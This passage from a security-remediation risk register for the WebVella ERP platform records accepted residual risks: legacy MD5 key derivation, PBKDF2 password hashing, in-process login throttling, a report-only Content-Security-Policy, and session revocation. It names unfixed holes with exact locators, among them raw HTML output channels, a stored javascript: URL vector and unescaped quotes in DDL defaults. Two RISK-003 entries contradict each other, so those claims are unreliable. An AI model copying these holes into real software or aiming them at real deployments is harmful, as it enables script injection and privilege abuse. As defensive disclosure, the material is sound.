`CryptoUtility.cs` (at lines 188, 200, 210 and 227), where MD5 derives the symmetric key material for
the platform's legacy symmetric encryption. The `CryptoUtility.cs` occurrences are pre-existing code
that predates this audit and are not credential storage; they belong to the same legacy symmetric
envelope that RISK-006 covers, and they are retained for the identical reason — changing the key
derivation would make every value already encrypted by an earlier release undecryptable. They are
recorded here so that the diagnostic count is fully accounted for and no occurrence is mistaken for a
regression introduced by this remediation. Their exit condition is RISK-006's versioned envelope plus
a re-encryption pass, not the credential migration.

**Why the code stays.** The legacy path is retained solely so that credentials already stored by
earlier releases can still be verified and then upgraded in place. Deleting it would lock out every
user whose credential has not yet been rehashed, which the requirement that existing credentials keep
working forbids. The migration design is in the
[credential migration guide](credential-migration.md).

**Why it is not suppressed.** No global suppression and no `NoWarn` entry is added, because
suppressing `CA5351` repository-wide would also hide any *new* broken-algorithm use introduced
anywhere else in ~700 source files. The warning is therefore left in place as a standing, visible
reminder that a legacy population still exists.

**Exit condition.** When no account carries a legacy hash any longer, the two legacy members in
`PasswordUtil.cs` can be removed and the `CA5351` occurrence there disappears on its own. The four
`CryptoUtility.cs` occurrences are not cleared by that step and are tracked under RISK-006 instead.

#### RISK-003 — Password hashing deviates from the literal wording of the cryptographic standard

| Field | Value |
| --- | --- |
| **Status** | Accepted — two deviations, both surfaced rather than absorbed. Substituting a dedicated package remains an open repository-owner option. |
| **Related finding** | C-03 (CWE-916 / CWE-759, OWASP A02:2021) |
| **Location** | `WebVella.Erp/Utilities/PasswordUtil.cs` |

**Deviation 1 — algorithm family.** The mandated Cryptographic Standards name bcrypt, scrypt or
Argon2 at a cost factor of 12 or above. The implementation uses PBKDF2 instead. The reasoning:
the authoritative OWASP Password Storage guidance sanctions PBKDF2 explicitly at a high iteration
count; PBKDF2 ships in the framework already referenced by this project
(`FrameworkReference Microsoft.AspNetCore.App`), so it adds no package dependency, which the
minimal-change constraint prefers; and the platform vendor's own guidance steers applications that
store password hashes toward this component rather than raw key-derivation calls. The deviation
satisfies the standard's unambiguous intent — slow, salted, work-factored, fixed-time verification.

**Deviation 2 — pseudo-random function.** The mandated parameters name HMAC-SHA-256 *and* the
versioned (V3) format. In ASP.NET Core those two are mutually exclusive: the V3 format **is**
PBKDF2-HMAC-SHA512, and `PasswordHasherOptions` exposes no pseudo-random-function selector — only
`CompatibilityMode` and `IterationCount`. V3 is kept, because it is the only route that also supplies
the framework's fixed-time verification and its rehash-needed upgrade signal, both of which the
migration requires. The outcome exceeds the named requirement rather than falling short of it: the
OWASP iteration floor for PBKDF2-HMAC-SHA512 is 210,000 and the implementation uses 600,000.

**Owner option, if literal compliance is required.** Add a dedicated bcrypt or Argon2 package and
substitute it behind the same `HashPassword` / `VerifyPassword` members. The migration design is
unaffected: the format discriminator keys on the stored value's shape, so a third format can be
introduced by the same upgrade-on-next-authentication mechanism. The cost is one new dependency,
which is the reason it was not taken by default.

#### RISK-008 — Login throttling is per-process, and its state does not survive a restart

| Field | Value |
| --- | --- |
| **Status** | Accepted — scope limitation documented rather than hidden. A distributed backing store is a standing recommendation, deliberately not built. |
| **Related finding** | H-16 (CWE-307, OWASP A07:2021) |
| **Location** | `WebVella.Erp.Web/Services/LoginThrottleService.cs` |

**What the limitation is.** The failure counters are held in the platform's existing in-process cache.
Two consequences follow:

* **Multi-instance deployments are not protected.** Each process counts failures independently, so a
  load-balanced deployment of *n* instances tolerates roughly *n* times the configured threshold
  before any single instance locks an account out.
* **State does not survive a process restart or recycle.** The store is size-bounded rather than
  pinned: `CacheItemPriority.NeverRemove` is deliberately NOT used, because exempting lockout entries
  from the ceiling would restore the unbounded growth the ceiling exists to prevent. What protects an
  in-force lockout instead is eviction ORDER - a lockout is written at `High` priority while a
  still-counting entry is written at `Low`, so pressure discards partial counts long before it reaches
  a lockout - together with an entry lifetime sized to the counting window. A restart, however,
  discards the cache entirely, and absent state necessarily reads as "no failures recorded". An
  in-force lockout is therefore released by a restart.

**Why absent state must read as "no failures".** The alternative — treating missing state as locked —
would lock out every user after any restart or deployment. That is an availability failure far worse
than the exposure it would close, and it breaches the "all existing functionality remains operational"
preservation requirement.

**Why the in-process cache was chosen anyway.** It is the least invasive control that closes H-16: it
avoids both a database schema change and a new package dependency, which the minimal-change
constraint requires. A lockout that holds for the lifetime of a process is a large improvement over
the unlimited attempts that existed before.

**Recommended fix.** Move the counters to a distributed backing store shared by every instance — a
cache or table reachable by all processes — keyed exactly as today. Note that "as today" means TWO
independent keys, not one composite key: the service counts an account and a source address on
separate entries with separate thresholds, and collapsing them into a single composite key while
porting the store would reintroduce the address-rotation bypass documented under the bypass-resistance
model below. That converts both limitations at once. It is deliberately not built here, because it introduces
either infrastructure or a schema change, and neither is within a security remediation's scope.

**Complementary control.** Transport-level rate limiting is a separate layer that belongs in each
host pipeline and is not provided by this service. Adding it is recorded in the
[secure configuration guide](secure-configuration.md) as host wiring; a per-address fixed-window
limiter bounds attempt *rate* even where the lockout's state has been lost.


## Detailed entries — risks arising from the integrated controls

#### RISK-002 — Uncontrolled recursion in `AutoMapper` survives the upgrade only as a developer error

| Field | Value |
| --- | --- |
| **Status** | Accepted — residual. See RISK-001. |
| **Related finding** | H-01 / H-11 |

**This entry has been corrected twice, so the history is stated rather than quietly overwritten.** A
first revision said "the advisory is closed by the upgrade"; a second revision withdrew that as "no
longer true", on the belief that the vulnerable version had been retained. **The second correction
was itself wrong.** The pin is `[15.1.3]` — RISK-001's open item is the *licence*, not the version — and
no vulnerable package is reported in any of the 19 projects. That takes two commands rather than one,
because the solution enumerates 17 of them:
`dotnet list WebVella.ERP3.sln package --vulnerable --include-transitive` covers the 17 members, and the
same command run against `WebVella.Erp.WebAssembly/Server` and `WebVella.Erp.WebAssembly/Shared` covers
the remaining two. All 19 report `has no vulnerable packages` — so the advisory **is** closed and the vulnerable package is **not**
in the graph. What remains, and is the reason this entry is retained, is that a self-referential
mapping authored in source is a developer error the patched library cannot correct; it bounds the
recursion without making the mapping right. It is not reachable by an external actor for the reasons
set out in RISK-001. No control is added, consistent with fixing only what is confirmed and with the
prohibition on enhancement beyond remediation.

#### RISK-003 — Password hashing uses PBKDF2 rather than bcrypt, scrypt or Argon2

| Field | Value |
| --- | --- |
| **Status** | Accepted — sanctioned deviation from the literal wording of the cryptographic standard. |
| **Related finding** | C-03 / CR-1, M-3 (CWE-916, OWASP A02:2021) |

**The governing standard, quoted verbatim** so that the deviation is measured against the actual
wording rather than against a paraphrase of it. This is the engagement's Cryptographic Standards
block:

```text
- TLS 1.2+
- AES-256-GCM
- RSA-2048+ / ECDSA P-256+
- bcrypt / scrypt / Argon2 with cost factor 12+
- CSPRNG
```

The fourth line names three algorithm families at a minimum cost factor, and **the chosen primitive is
none of those three.** It is **PBKDF2-HMAC-SHA256 at 600,000 iterations** with a 128-bit
cryptographically-random salt and constant-time verification, taken from the framework's own password
hasher. Four reasons are given openly rather than glossed:

* **It is sanctioned by the authority, not merely tolerated.** OWASP's Password Storage guidance
  specifies Argon2id, bcrypt at a work factor of at least 10 subject to a 72-byte input limit, **and**
  PBKDF2 with at least 600,000 iterations using HMAC-SHA-256. PBKDF2 at that iteration count is
  therefore an approved choice, not a compromise.
* **It satisfies the standard's unambiguous intent** — slow, salted, work-factored, fixed-time
  verification.
* **It adds no dependency**, which the least-invasive-control constraint prefers. Every control in this
  remediation resolves from the `Microsoft.AspNetCore.App` framework reference already present at
  `WebVella.Erp/WebVella.Erp.csproj:L43`.
* **The framework hasher's verification routine already performs a fixed-time comparison**, which
  closes `M-05` as a by-product rather than as separate work.

**The owner option, recorded rather than assumed away:** adding a dedicated bcrypt or Argon2 package is
available if literal-wording compliance is required. It would be the **only** new package dependency in
the entire remediation, which is why it is not taken unilaterally.

**A withdrawn justification.** An intermediate revision of the source claimed that HMAC-SHA-256 and
the versioned payload format were mutually exclusive in ASP.NET Core. **That claim is false and has
been withdrawn** — the two are compatible and the implementation uses both. This deviation is now the
only one remaining in this area. See [the credential migration guide](credential-migration.md).

#### RISK-022 — Content-Security-Policy ships in report-only mode

| Field | Value |
| --- | --- |
| **Status** | Accepted — staged rollout, **with an open owner decision on the promotion to enforcement**. The mandated policy *value* is emitted verbatim; only the delivery mode is staged. |
| **Related finding** | M-01, L-1 (OWASP A05:2021) |
| **Owner** | The **application security owner** for the platform — that is, whoever owns `SecurityHeadersOptions` and the seven host pipelines — jointly with the **frontend maintainer** for the plugin and tag-helper surfaces that emit the inline markup. Enforcement cannot be promoted by an infrastructure change alone, because clearing the backlog means editing components; that is why the decision is owned by both roles rather than by whoever last touched the middleware. |
| **Promotion gate** | See *Governance of the promotion to enforcement* immediately below — the threshold, the criteria and the stage exit conditions are stated there rather than left to judgement. |

**Report-only is NOT the remediation for H-06, and must not be recorded as such.** This needs saying
explicitly, because the two are adjacent and easily conflated. `H-06` (stored cross-site scripting,
CWE-79, OWASP A03) is remediated in the view and builder layer: text sinks were encoded by deleting
the raw wrapper, and every channel deliberately retained as by-design markup is enumerated in
`RISK-023` and `RISK-032`. The content policy is a **compensating control layered on top of that
work**, and while it ships report-only it is **detective, not preventive** — a browser reports the
violation and then executes the script anyway. So report-only closes nothing on its own. Any status
summary that cites the content policy as evidence for `H-06` is wrong; cite the encoding work and the
two risk entries instead.

##### Governance of the promotion to enforcement

**Violation threshold — the quantitative bar.** Promotion requires **zero** report-only violations
attributable to first-party code, measured over a **14-consecutive-day** window, across **all seven
host applications**, and covering at minimum the screen set named in the stage-2 criteria below.
"Zero" is the bar rather than a percentage reduction because a single surviving inline script is
sufficient to break the interface the moment the header name changes, so a 99%-clear backlog is
functionally identical to an untouched one. Violations attributable to browser extensions or to
operator-injected third-party markup are excluded from the count, but must be individually listed and
justified in the promotion record rather than silently discounted.

**Measured starting position, so progress is against a real number.** A single authenticated browsing
session produced **at least 379** report-only violations; one isolated page context accounted for
**137** of them, distributed **132 inline-style, 3 inline-script, 2 `eval`**. Two directives the
mandated value does not account for at all — `img-src 'self' data:` and `worker-src blob:` — are
prerequisites regardless of progress on the inline backlog, because both currently fall through to
`default-src 'self'` and would break images and the code editor on the first enforcing request.

**Stages, each with an explicit exit condition.** No stage may be skipped, and each exit condition is
observable rather than declarative.

| Stage | Work | Exit condition (must be demonstrated, not asserted) |
| --- | --- | --- |
| 1 | Add the two missing directives to the mandated value and redeploy report-only | `img-src` and `worker-src` violations fall to zero; images and the Ace editor verified working on every host |
| 2 | Clear the inline-**style** backlog (the 132-per-context dominant class) — CKEditor 5, the `wv-lazyload`/Stencil bundle, the Ace editor, and the framework 1×1 GIF spacer | Zero `style-src` violations across a full pass of: login, dashboard, each list view, each record view, the page designer, the SDK code editor, and the Project widgets, on all seven hosts |
| 3 | Clear the inline-**script** and `eval` backlog (3 + 2 per context) — including the two generated-inline-script emitters held under `RISK-023` | Zero `script-src` and zero `eval` violations over the same pass; the `RISK-023` channels either refactored to external script or formally re-accepted with a `'nonce-'`/`'strict-dynamic'` amendment to the mandated value |
| 4 | Hold report-only unchanged and observe | The 14-day / seven-host / zero-first-party-violation threshold above is met and recorded |
| 5 | Flip `SecurityHeadersOptions.ContentSecurityPolicyReportOnly` to `false` | The enforcing `Content-Security-Policy` header is confirmed on both a dynamic and a static response on every host, and the manual verification checklist is re-executed with no regression |

**The `eval` subset of stage 3 cannot be cleared by hashes or nonces, and one source of it is
third-party.** This is recorded separately because stage 3's exit condition reads naturally as
"refactor the inline blocks or adopt a nonce", and that route does not exist for `eval`: a nonce or a
hash authorises a *known script*, while `'unsafe-eval'` is what authorises *string evaluation*, so no
amount of first-party refactoring clears an `eval` violation raised inside a dependency. Runtime
validation localised one such source exactly:
`/_content/WebVella.Erp.Web/js/wv-lazyload/p-7e344a40.js`, a vendored Stencil lazy-load chunk, which
evaluates a string as JavaScript and reports `kEvalViolation` against `script-src` (observed on the
login page and again on the authenticated home page of a host serving the report-only policy). Two
routes exist and both are decisions rather than tasks: **amend the mandated value with
`'unsafe-eval'`** — a genuine weakening of the mandated header set that belongs to the owner named
above, not to whoever clears the backlog — or **rebuild or replace the vendored chunk**, which is
third-party asset work that the audit plan's modification boundary excludes from this remediation
(third-party code: version updates only). Until one of them is taken, stage 3's "zero `eval`
violations" exit condition is **not achievable by first-party work alone**, and any plan that assumes
otherwise will stall at stage 3. CKEditor 5 is the second `eval` source and has the same property.

**If the owner declines to promote.** Enforcement is then formally deferred rather than quietly
pending: the deferral is recorded here with its date and rationale, `RISK-022` stays open, and the
compensating control remains documented as **detective only** — which in turn means the retained
by-design markup channels in `RISK-023` and `RISK-032` continue to rest on the privileged
markup-authoring contract alone. That is a materially weaker position than the mandated header set
implies, and it must not be represented as the mandated posture having been achieved.

Enforcing `script-src 'self'; style-src 'self'` immediately would break the interface, violating the
requirement that existing functionality be preserved. Report-only was chosen so violations are
measured rather than guessed, and it has produced a concrete blocker inventory — including **two
directives the mandated policy does not account for at all**: `img-src 'self' data:` (a framework 1×1
GIF spacer) and `worker-src blob:` (the Ace editor's syntax worker). Both fall through to
`default-src 'self'` and would break images and the code editor on day one.

The inline-emitting surface is also **wider than the four components originally identified**: real
reports additionally implicate CKEditor 5, the `wv-lazyload`/Stencil bundle (inline style *and*
`eval`), and the Ace editor. Enforcement is a project, not a flag. The route to enforcement is in
[the secure configuration guide](secure-configuration.md).

**Scale of the backlog, measured rather than estimated.** A single authenticated browsing session
produced **at least 379** report-only violations. One isolated page context alone accounted for
**137**, broken down as **132 inline-style, 3 inline-script and 2 `eval`**. The distribution is the
useful part: inline *style* dominates by an order of magnitude, so the practical sequence is to address
`style-src` first, then the far smaller `script-src` and `eval` sets — and to add the two missing
directives above, which are prerequisites regardless of progress on the inline work.

#### RISK-005 — RETIRED: the CSP report endpoint no longer exists

| Field | Value |
| --- | --- |
| **Status** | **Retired.** The risk was a property of a component that has since been removed in full. |
| **Related finding** | `L-1`; the self-identified CWE-779 log-flooding vector; and `CFG-02` / `CFG-04`, which caused the removal |

**What this risk used to be.** `/csp-violation-report` was anonymous by necessity — a violation report
cannot carry a session — and an unbounded anonymous logging sink is a log-flooding vector. Logging was
therefore capped at 120 reports per minute, checked before the body was read, with the bound applied to
*logging* rather than to *acceptance* so that a refused report (which a browser does not resend) could
not corrupt the evidence the report-only stage exists to gather.

**Why it is retired rather than reduced.** The endpoint was removed entirely, for two reasons unrelated
to log flooding:

* its `report-uri` directive changed the emitted `Content-Security-Policy` value, which the audit
  specifies exactly; and
* to accept a report ahead of routing, the collector branch returned from the middleware — giving the
  middleware a path that completed a request **without attaching the other six headers**.

With no endpoint there is no anonymous sink, so there is nothing left to flood. This is a genuine
retirement and not a reclassification: the mitigating control (the logging cap) was deleted along with
the thing it mitigated, and neither is needed.

**Where violation reports come from now.** The browser console, for the duration of the report-only
rollout. It carries the same blocked-URI and violated-directive information the endpoint recorded. A
deployment that wants aggregation should terminate `report-to` at a reverse proxy or a dedicated
collector service rather than inside the header middleware — which keeps the header-attachment path
single and unconditional, the property whose absence was `CFG-04`.

#### RISK-023 — Four by-design raw-output channels are not encoded

| Field | Value |
| --- | --- |
| **Status** | Accepted — remediated by compensating control. |
| **Related finding** | H-06 (CWE-79, OWASP A03:2021) |

The HTML-block page component (design and display views) and two generated-inline-script emitters
exist *in order to* emit markup and script. Encoding them would disable the features outright,
breaching the functionality-preservation requirement. The compensating controls are restricting
markup and script authoring to privileged roles, plus the Content-Security-Policy once enforced.
These four channels are the concrete reason RISK-022 exists.

**The four channels, quoted from source.** The constructs are reproduced exactly as the repository
spells them, misspellings included — `ProccessedHtml` and `EmbededJs` are the source's own spellings,
and correcting them here would misquote the evidence:

| Locator | Construct as it appears in source |
| --- | --- |
| `WebVella.Erp.Web/Components/PcHtmlBlock/Display.cshtml:L10` | `@Html.Raw(ViewBag.ProccessedHtml)` |
| `WebVella.Erp.Web/Components/PcHtmlBlock/Design.cshtml:L10` | `<div class="p-1">@Html.Raw(ViewBag.ProccessedHtml)</div>` |
| `WebVella.Erp.Web/Components/Nav/Nav.Default.cshtml:L48` | `@Html.Raw(ViewBag.EmbededJs)` |
| `WebVella.Erp.Plugins.SDK/Components/WvSdkPageSitemap/Form.cshtml:L92` | `@Html.Raw(ViewBag.EmbededJs)` |

The first two are the markup-block component: a page author supplies markup and the component's whole
purpose is to render it. The last two emit generated inline script, and they are the specific reason the
mandated `script-src 'self'` policy cannot be enforced on first deployment — see RISK-022.

**Scope of this acceptance, stated explicitly.** It covers those four channels and nothing else. The
other stored sinks that H-06 names — the shared navigation and site-menu views, and the six Project
widget views — are **not** accepted risk, and they are closed by two different shapes of the same
control, so it is worth being precise about which applies where.

* **Navigation and site menu.** `NavItem.cshtml` rewrites the composed string as markup in order to
  inject the dropdown toggle, so the raw-output helper has to stay. The remediation therefore lands at
  the point of composition in `BaseErpPageModel`: every database value interpolated into
  `MenuItem.Content` is HTML-encoded, URL-allow-listed or character-constrained *before* it becomes
  markup, so the value reaching the helper is already safe.
* **The six Project widget views.** Here the raw-output helper is **gone**. The three widget builders no
  longer compose markup at all; they publish each value as its own data field — with the priority icon
  class and colour additionally character- and grammar-constrained — and the `img`, `i` and `a`
  elements are authored in the views, where Razor encodes every value automatically and in the correct
  context for its position. Encoding happens exactly once, in the view.

Nothing in this record should be read as accepting an unencoded database value in navigation, menu or
widget content.

**The three `IsHtml`-guarded navigation and menu channels — a fifth, related acceptance.** These are
recorded separately and precisely, because the naive description of them would be a false claim: they
are **not** unconditional sinks. Each is an opt-in markup channel whose safe, auto-encoded path is
already present in the `else` branch, and the raw branch runs only when a caller has set
`IsHtml = true`. Line numbers below are the **current** ones; they sit later in each file than the audit
report's locators because the remediation inserted its own explanatory comments above them.

| View | Guarded raw branch | Safe auto-encoded branch |
| --- | --- | --- |
| `WebVella.Erp.Web/Pages/Shared/NavItem.cshtml` | `@if (navItem.IsHtml)` L25 → `@Html.Raw(navItem.Content)` L27; the pattern repeats at L51 → L53 for leaf nodes | `else` L29 → `@navItem.Content` L31; and `else` L55 → L57 |
| `WebVella.Erp.Web/Pages/Shared/NavMenu.cshtml` | `@if (menu.IsHtml)` L25 → `@Html.Raw(menu.Content)` L27; repeats at L57 → L59 for the no-wrapper branch | `else` L29 → `@menu.Content` L31; and `else` L61 → L63 |
| `WebVella.Erp.Web/Components/SiteMenu/SiteMenu.cshtml` | `@if (menuItem.IsHtml)` L30 → `@Html.Raw(menuItem.Content)` L32 | `else` L34 → `@menuItem.Content` L36 |

**What the residual actually is.** Not an anonymous stored-XSS channel — a **privileged-author** one:
whoever can set `IsHtml = true` and author the `Content` value. The database values interpolated into
that content are already encoded, URL-allow-listed or character-constrained at composition time in
`BaseErpPageModel`, so an ordinary data path cannot reach the raw branch with attacker text. The
compensating control is the same as for the four channels above — markup authoring restricted to
privileged roles, plus the Content-Security-Policy.

**The blast radius is why this belongs here rather than being waved away.** All three views render on
**every page of every one of the seven hosts**, so a privileged author's mistake is product-wide rather
than screen-local. Recorded, owned, and revisitable.

The same triage applies to the data-source icon value, now at
`WebVella.Erp.Plugins.SDK/Pages/data_source/list.cshtml:L35` with its triage comment at `:L28-L34`. It
is deliberately left as a markup channel rather than encoded, and the reason is narrower than the
navigation case: its only producer is `PageUtils.GetDataSourceIconBadge`, a switch over the
`DataSourceType` enum returning one of two hard-coded badge literals or the empty string. No return
value carries an interpolation hole, so no user input and no database text can reach that sink on any
path, and encoding it would render the badge markup as literal visible text.

### Accepted risks — residual and bounded

#### RISK-032 — A dangerous URL scheme stored in a sitemap node URL survives HTML encoding

| Field | Value |
| --- | --- |
| **Status** | Accepted — bounded residual, disclosed rather than fixed. |
| **Related finding** | H-06 (CWE-79, OWASP A03:2021) — the stored cross-site-scripting class. |
| **Location** | `WebVella.Erp.Web/Models/BaseErpPageModel.cs:392-402`, where the in-code comment defers here by name. |

The `H-06` remediation HTML-encodes the three persisted sitemap values — `node.Url`, `node.Label` and
`node.IconClass` — before they are interpolated into the `href`, `title` and `class` attributes of
markup that `NavItem.cshtml` and `NavMenu.cshtml` emit raw. That closes **attribute and element
breakout**, which was the finding: an encoded value can no longer terminate its attribute or open a
`<script>` element.

**What encoding cannot do is change what a URL scheme means.** `href="javascript:…"` is dangerous
because of the scheme, not because of any character that encoding would alter, and an encoded
`javascript:` payload is still a `javascript:` URL. So a sitemap node whose stored URL carries an
active scheme remains a script-execution vector when a user clicks it.

It is accepted rather than fixed, for three reasons taken together:

* **The authoring surface is administrator-only.** Editing the sitemap is a design function, not a
  data-entry one. An actor who can author a sitemap node already holds the privilege the vector would
  obtain.
* **The breakout half — the part that made this a stored-XSS finding — is genuinely closed.** The value
  is confined to its attribute, so it cannot escape into surrounding markup or affect any other
  element on the page.
* **Scheme allow-listing would break legitimate authoring.** A designer is entitled to author `mailto:`
  and `tel:` links, and in this platform also relative and app-relative URLs; an allow-list narrow
  enough to exclude `javascript:` reliably would need maintaining against every scheme a designer may
  legitimately want. Under the Minimal Change Clause that is out of scope for this finding.

Note that this is a **different** risk from `RISK-016`, which concerns three static
`href="javascript: void(0)"` Bootstrap dropdown placeholders that are byte-identical on every page and
carry no stored value at all. `RISK-016` is *not a defect*; `RISK-032` is a real residual.

*Recommendation for a future sprint:* validate the stored URL at the point of authoring — a scheme
allow-list applied in the sitemap editor, where a rejected value can be explained to the author — in
preference to filtering at render time, where the only available behaviour is to silently drop a link
the designer believes they created.

#### RISK-033 — `ConvertDefaultValue` builds DDL default literals without escaping quotes

| Field | Value |
| --- | --- |
| **Status** | Accepted — disclosed, not fixed. Outside the reported finding set. |
| **Related finding** | None. Discovered while adjudicating the `CA2100` diagnostics for the static-analysis gate. |
| **Location** | `WebVella.Erp/Database/DbRepository.cs` — `ConvertDefaultValue`, consumed by `CreateColumn`. |

`ConvertDefaultValue` renders a field's default value into a DDL fragment by concatenation: `"'" +
value + "'"` for text, HTML and URL fields, and `$"\"{val}\","` for multi-select fields. **Neither
form escapes a quote character embedded in the value**, so an administrator who authors a field
default containing a quote can influence the generated `DEFAULT` clause. This is the one `CA2100`
report in the adjudicated ledger whose justification is "bounded and disclosed" rather than "not a
sink".

Bounded, and the bounds are what make it acceptable rather than urgent:

* **Reachable only by an administrator**, through schema design — creating or altering a field
  definition. That is already among the most privileged operations the platform offers, and it can
  execute arbitrary DDL by design.
* **No unauthenticated or non-administrative path reaches it.** It is not driven by record data, query
  input, or any request parameter.
* **It is a pre-existing condition**, not introduced by this remediation, and no reported finding
  covers it. Fixing it is therefore governed by *document out-of-scope concerns but do not fix unless
  Critical* — and privilege-bounded DDL influence by an actor who may already author DDL is not
  Critical.

*Recommendation for a future sprint:* route the literal through the same validate-and-quote discipline
introduced for identifiers (`WebVella.Erp/Database/DbIdentifier.cs`), or bind the default as a
parameter where the target dialect permits it in a `DEFAULT` clause. Treat it as hardening of an
administrative surface rather than as closing an exposure.

#### RISK-034 — SUPERSEDED TWICE: the `CA3001`–`CA3012` taint-analysis family does not run at all

> **Superseded twice in mechanism, retained for its measurements.** This entry has been overtaken by two
> successive changes, and both are recorded because the second reverses the first.
>
> *First,* the entry was written against a design in which an explicit `security.globalconfig` armed a
> hand-picked rule set and left the taint family out of it. Neither that file nor that design ever
> shipped. What shipped instead was `AnalysisLevelSecurity=latest-all` arming the whole Security
> category, with a repository-root `.globalconfig` holding the twelve rules to
> `dotnet_code_quality.CA30xx.interprocedural_analysis_kind = None` — a cost knob, never a severity and
> never a suppression. Under that design the family **did** run, at warning severity, intraprocedurally.
>
> *Second,* AAP 0.6.1 Class 2 freezes the analyzer gate at `EnableNETAnalyzers` plus
> `AnalysisLevel=latest-recommended`, so both `AnalysisLevelSecurity` and the `.globalconfig` were
> withdrawn. **The family therefore does not run at all today** — not interprocedurally, not
> intraprocedurally. The withdrawal could not be partial: the `dotnet_code_quality.*` options have no
> MSBuild equivalent, so removing the file while keeping the level took a single-project build from
> 109 s to a timeout at 600 s.
>
> What survives from the original probe is that the rules *work* — a deliberate single-method flow from
> `HttpContext.Request.Query` into `DbCommand.CommandText` was reported as `warning CA3001` — so their
> present silence is the silence of a rule that is switched off, and carries no signal whatsoever. The
> canonical entry for the shipped disposition is the restated `RISK-051`; the timings below remain the
> reason the family cannot simply be switched back on.

| Field | Value |
| --- | --- |
| **Status** | Accepted — a measured infeasibility, and the measurement still governs. What was declined is *interprocedural* tracking on this family, not the family itself. |
| **Related finding** | Gate 1 (static analysis), the `F-07` enforcement work. |
| **Location** | No location in the tree. The twelve `interprocedural_analysis_kind = None` options lived at `.globalconfig` lines 145–156; that file has been deleted, and no configuration mentioning `CA3001`–`CA3012` remains anywhere. (An earlier revision cited `security.globalconfig`; no such file ever existed.) |

The pinned SDK's Security category contains **94** rules. The shipped gate arms **four** of them —
`CA5350`, `CA5351`, `CA5359`, `CA5364`, the set `AnalysisLevel=latest-recommended` enables on its own —
and the taint family `CA3001`–`CA3012` is not among the four. Two independent reasons keep it out, and
both matter: the frozen gate does not authorise the `AnalysisLevelSecurity` upgrade that would reach it,
and *even if it did*, the cost is prohibitive rather than merely inconvenient. The second reason is the
one this entry measures, by four timed trials against a single project, `WebVella.Erp.Web`, with
everything else held identical:

| Trial | Rules enabled | Result |
| --- | --- | --- |
| A | none | exit 0 in **24 s** |
| B | `CA3001`–`CA3012` (12 rules) | **timed out**, killed at 1 500 s (exit 124) |
| C | the other 72 rules | exit 0 in **369 s** |
| E | just `CA3002`, `CA3003`, `CA3012` (3 rules) | **timed out**, killed at 1 500 s (exit 124) |

Trial E is the decisive one: reducing the family to three rules did **not** make it tractable, so the
cost is inherent to interprocedural dataflow on a codebase of roughly 700 source files rather than
proportional to how many of these rules are switched on. A gate that cannot finish is not a weaker
gate — it is no gate at all, because in practice it would be disabled.

*Provenance:* these four timings are *contemporaneous observations* on a heavily contended shared
host — see the [evidence-provenance table](remediation-log.md#evidence-provenance). The 1 500 s bound
was the trial's own timeout, not a measured completion. What is durable is the qualitative outcome:
two configurations completed and two did not.

**One precision on the count.** The trial that completed timed **72** rules; the shipped set is **71**.
The difference is not cost-related: `CA3147` was removed afterwards for a different reason — it is an
antiforgery rule, and the plan of record explicitly declines antiforgery enforcement on the MVC API
surface because existing clients post without a verification token. `CA5391`, its modern counterpart,
is excluded for exactly the same reason. Neither rule is armed by any explicit severity anywhere: the
`.globalconfig` that once could have carried one has been deleted, and an earlier revision of this
paragraph claimed both exclusions were "recorded in `security.globalconfig`", which is not a file that
ever existed. Both report zero occurrences in the build — as does every Security-category rule outside
the four the frozen gate enables, which is why a zero here must not be read as clearance.

*Recommendation for a future sprint:* run the taint family out-of-band — a scheduled job over a single
project at a time, with a generous timeout — rather than in the per-push gate. That keeps the analysis
available without making every push pay for it.


#### RISK-007 — No token revocation list; sign-out does not invalidate a bearer token

| Field | Value |
| --- | --- |
| **Status** | **Closed.** Server-side session revocation applies to both credential forms: cookie tickets *and* bearer tokens. The in-process scope of the store is tracked separately as `RISK-036`. |
| **Related finding** | H-02 / H-4 (CWE-613, OWASP A07:2021); narrowed by review finding `F8`, then closed by review finding `CR2-F-02` (session hijacking) |

The audit's remediation guidance preferred rotating, revocable refresh tokens. That is **not**
implemented, because rotation with revocation requires persisting issued and revoked token
identifiers — a **database schema change, which the remediation constraints forbid outright.**

Consequences **as originally shipped** (all three are now closed — see the two updates below, which are
retained in this order so the reasoning history stays auditable):

* There was no revocation list.
* **Signing out cleared the cookie; it did not invalidate an already-issued bearer token.**
* A stolen token remained usable until the earlier of its own expiry and the absolute session horizon.

What *was* achieved: a **7-day absolute session horizon**, stamped at issue and carried verbatim
across every refresh, with refresh past the horizon refused and refreshed expiry capped at it. This
reduces worst-case exposure from **unbounded to at most 7 days with no operator action**. Previously
an anonymous refresh endpoint would renew a stolen token indefinitely, so one theft was permanent.

Recommended future work: a revocable refresh-token table with rotation and reuse detection, plus a
`jti` denylist.

**Update — the cookie half is now closed.** Review finding `F8` established that the same weakness had
a second, cheaper half: sign-out deleted one browser cookie and nothing else, so a cookie *copied*
before sign-out kept authenticating for the remainder of the eight-hour ticket lifetime. That half is
now closed without any schema change. Every ticket carries a per-sign-in `erp_session_id` claim,
`AuthService.LogoutAsync()` records that identifier as revoked before it signs out, and a
`PostConfigureAll<CookieAuthenticationOptions>` hook registered once in `AddErp` consults the
revocation store on every cookie-authenticated request, rejecting the principal and signing out its own
scheme when the session is revoked. The revocation list lives in memory only, which is precisely why it
did **not** need the schema change this entry says the constraints forbid — and precisely why it carries
its own residual, `RISK-036`.

**The asymmetry that used to remain, measured rather than asserted.** With one account, both credential
forms were exercised across a single sign-out. Before: the cookie request answered `200` and the bearer
request answered `200`. After `GET /logout`: the cookie request answered `302` to the login page and
**the bearer request still answered `200`.** That single observation is what the update below closes.

**Update — the bearer half is now closed too, and this entry is therefore closed.** Review finding
`CR2-F-02` established that the reasoning which kept the bearer half open was circular: a bearer token had
no server-side session to end *because* nothing identified its session, and the stated conclusion — "a
bearer credential is inherently non-revocable without a schema change" — did not follow, because the
identifier the cookie half already used costs nothing to stamp into a token as well. Four coupled
changes close it, none of them touching the database:

* `AuthService.BuildTokenAsync` stamps the same `erp_session_id` claim into **every** issued token, and
  `GetNewTokenAsync` carries the presented token's identifier **verbatim** into its successor rather
  than minting a fresh one — so a revocation survives refresh instead of being shed by it.
* `AuthService.GetValidSecurityTokenAsync` refuses a validated token whose identifier is revoked, and
  refuses one carrying no parseable identifier at all.
* `GetNewTokenAsync` refuses to mint a successor for a revoked or unidentifiable session, so the refresh
  endpoint can no longer resurrect an ended session.
* The framework bearer handler — the validator that actually authorises `[Authorize]` endpoints, because
  the `JWT_OR_COOKIE` policy scheme forwards to it — now fails the token in `OnTokenValidated` through
  the shared `AuthService.IsBearerSessionRevoked` predicate. The hook is installed in the two hosts that
